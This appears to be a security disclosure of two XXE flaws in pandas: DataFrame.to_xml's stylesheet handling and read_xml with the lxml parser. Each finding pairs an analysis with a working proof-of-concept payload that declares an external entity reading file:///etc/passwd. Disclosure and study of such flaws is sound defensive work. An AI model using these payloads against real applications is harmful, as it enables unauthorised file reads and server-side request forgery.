title: XML External Entity (XXE) Injection in pandas DataFrame.to_xml via lxml parser
analysis:
The function `_transform_doc()` in `pandas/io/formats/xml.py` instantiates `lxml.etree.XMLParser` with only the `encoding` parameter. In `lxml`, the `XMLParser` has the parameter `resolve_entities` set to `True` by default. This allows the parser to resolve external entity declarations inside DOCTYPE headers of parsed stylesheet documents.

If an application uses `DataFrame.to_xml(..., stylesheet=...)` on an untrusted stylesheet path or content, an attacker can supply a malicious stylesheet XML payload referencing external local files (e.g. `file:///etc/passwd` or `file:///windows/win.ini`) or internal network services, leading to XML External Entity (XXE) Injection / Arbitrary File Read / SSRF.

Conceptual Exploit Payload:
```python
import pandas as pd
import io

df = pd.DataFrame({'col': [1, 2]})

# Malicious XSLT Stylesheet containing XXE payload:
xslt_payload = '''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xsl:stylesheet [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <out>&xxe;</out>
  </xsl:template>
</xsl:stylesheet>'''

# Triggering the XXE vulnerability:
xml_output = df.to_xml(stylesheet=io.StringIO(xslt_payload))
print(xml_output)
```

title: XML External Entity (XXE) Injection in pandas.read_xml via lxml parser
analysis:
The function `_LxmlFrameParser._parse_doc()` in `pandas/io/xml.py` instantiates `lxml.etree.XMLParser` with only the `encoding` parameter. In `lxml`, the `XMLParser` has the parameter `resolve_entities` set to `True` by default. This allows the parser to resolve external entity declarations inside DOCTYPE headers of parsed XML documents.

If an application uses `pandas.read_xml(..., parser="lxml")` on untrusted input, an attacker can supply a malicious XML payload referencing external local files (e.g. `file:///etc/passwd` or `file:///windows/win.ini`) or internal network services, leading to XML External Entity (XXE) Injection / Arbitrary File Read / SSRF.

Conceptual Exploit Payload:
```python
import pandas as pd
import io

payload = '''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <row>
    <data>&xxe;</data>
  </row>
</root>'''

df = pd.read_xml(io.StringIO(payload), parser="lxml")
print(df)
```
